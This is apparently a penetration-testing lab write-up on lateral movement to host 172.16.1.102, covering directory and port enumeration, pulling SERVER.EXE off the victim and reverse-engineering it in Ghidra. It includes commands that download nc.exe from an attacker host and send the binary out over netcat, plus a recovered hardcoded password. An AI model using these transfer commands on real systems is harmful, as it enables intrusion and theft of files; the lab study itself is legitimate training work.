# Leteral Movement
## 172.16.1.102
Looking for any necessary file on the server
```powershell
C:\Apache24\htdocs\user\images>cd c:\\
c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EF32-6694

 Directory of c:\

06/23/2022  05:07 PM    <DIR>          Apache24
07/18/2022  09:32 PM    <DIR>          Apps
12/07/2019  01:14 AM    <DIR>          PerfLogs
07/18/2022  08:36 PM    <DIR>          php
07/26/2022  10:24 PM    <DIR>          Program Files
07/18/2022  09:21 PM    <DIR>          Program Files (x86)
07/18/2022  08:22 PM    <DIR>          Users
07/26/2022  10:24 PM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)   9,051,906,048 bytes free

c:\>cd c:\Apps
c:\Apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EF32-6694

 Directory of c:\Apps

07/18/2022  09:32 PM    <DIR>          .
07/18/2022  09:32 PM    <DIR>          ..
07/18/2022  09:32 PM           415,232 SERVER.EXE
               1 File(s)        415,232 bytes
               2 Dir(s)   9,049,509,888 bytes free

```

Looking for listening ports on the server
```
c:\Apps>netstat -nat | findstr LIST 
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       InHost      
  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING       InHost      
  TCP    172.16.1.102:139       0.0.0.0:0              LISTENING       InHost      
```

### Download the `SERVER.EXE`
```bash
$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```powershell
powershell wget 10.10.14.2/nc.exe -o nc.exe	
```
```bash
$ nc -lvnp 3333 > server.exe
listening on [any] 3333 ...
```
```powershell
nc.exe 10.10.14.2 3333 < C:\Apps\SERVER.EXE
```

`SERVER.EXE` info
```bash
$ file server.exe             
server.exe: PE32 executable (console) Intel 80386, for MS Windows, 5 sections      
```
```bash
$ strings server.exe | grep -A3 Access
Enter Access Name: 
Admin
Access Password: 
Wrong username!
P@$$worD
Correct Password!                                  
```

### Use ghidra to analyze the EXE file
```
Window => Defined Strings => Filter: Password   // "Correct Password!"
Click "Correct Password"   // shows corresponding function name in Listing Window.
Symbol Tree => Browse to that function   // FUN_10476cb0
Functions => FUN_10476cb0
Window => Decompile: FUN_10476cb0
```
```c
void __cdecl FUN_10476cb0(char *param_1)

{
  int iVar1;
  char local_404 [1024];
  
  thunk_FUN_10484890(local_404,0x801,param_1,0x800);
  iVar1 = _strncmp(&DAT_104d79a0,s_P@$$worD_104d51a8,8);
  if (iVar1 == 0) {
    thunk_FUN_10476fd0(s_Correct_Password!_104d51b4);
  }
  else {
    thunk_FUN_10476fd0(s_Wrong_password!_104d51c8);
  }
  return;
}
```
Based on the code above, seems like if this `thunk_FUN_10484890` is contains a function to copy all strings from the `param_1`, then it will lead to be a buffer overflow attack.